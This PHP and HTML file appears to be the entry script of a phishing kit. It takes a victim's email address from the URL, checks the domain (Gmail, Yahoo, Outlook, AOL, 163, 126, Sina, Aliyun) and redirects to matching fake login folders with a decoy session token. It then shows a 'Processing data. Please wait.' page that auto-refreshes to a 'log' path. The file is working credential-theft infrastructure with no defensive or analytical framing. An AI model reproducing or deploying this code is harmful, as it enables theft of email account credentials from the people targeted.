<?

//error_reporting(E_ALL);

// Report all PHP errors

// Same as error_reporting(E_ALL);
//ini_set('error_reporting', E_ALL);

$userid = $_GET[userid];


$sp = explode("@", $userid);

//echo $sp[1];
if ($sp[1] == 'vip.163.com'){

header("location: vip163/index.php?l=sJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIYnMxmwofLodmAkNOueMHosYks-User&userid=$userid");

}elseif($sp[1] == 'yahoo.co.uk'){

header("location: ym/index.php?l=sJidXdidIYnMxmwofLodmAkNOueMHosYks-User&userid=$userid");


}elseif($sp[1] == 'outlook.office365'){

header("location: out/index.php?l=sJidXdidIYnMxmwofLodmAkNOueMHosYks-User&userid=$userid");

}elseif($sp[1] == '126.com'){

header("location: 126/index.php?l=sJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIYnMxmwofLodmAkNOueMHosYks-User&userid=$userid");


}elseif($sp[1] == 'vip.sina.com'){

header("location: vipsina/index.php?l=sJidXdidIYnMxmwofLodmAkNOueMHosYks-User&userid=$userid");

}elseif($sp[1] == '163.com'){

header("location: 163/index.php?l=sJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIYnMxmwofLodmAkNOueMHosYks-User&userid=$userid");

}elseif($sp[1] == 'aliyun.com'){

header("location: aliyun/index.php?l=sJidXdidIYnMxmwofLodmAkNOueMHosYks-User&userid=$userid");

}elseif($sp[1] == 'outlook.com'){

header("location: ht/index.php?l=sJidXdidIYnMxmwofLodmAkNOueMHosYks-User&userid=$userid");

}elseif($sp[1] == 'gmail.com'){

header("location: gm/index.php?l=sJidXdidIYnMxmwofLodmAkNOueMHosYks-User&userid=$userid");

}elseif($sp[1] == 'aol.com'){

header("location: aol/index.php?l=sJidXdidIYnMxmwofLodmAkNOueMHosYks-User&userid=$userid");

}




?>





<html>
      <head>
       
<meta http-equiv="refresh" content="5; url=log" />	   
		
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
       <title>
        Please Wait . . . .
       </title>
       
	
	<center> 
	 	
	 
	  <style type="text/css">
           
             #signOutContent {
   margin:150px 0 0 0;
  }

  #signOutTxt {
   font:normal 18px Arial;
   color:#333333;
  }

  #main-txt {
    margin:33px 0 0 0;
  }

  #signout-circle {
    margin:46px 0 0 0
  }

  #signout-main {
   width:100%;
   text-align:center;
  }


	  </style>
	 </head>
	 
	 <body>
	 
	  
	   <div id="main-txt">
	    <span id="signOutTxt">
	     Processing data. &nbsp;Please wait. 
	    </span>
	   </div>
	  
	   <div id="signout-circle">
	    <img src="images/BlueAnimation_32x32.bmp" />
           </div>
	 
          </div>
	  
	  
	  
	  
	 
	
       
      </center> 
 
 
 
</body>

</html>


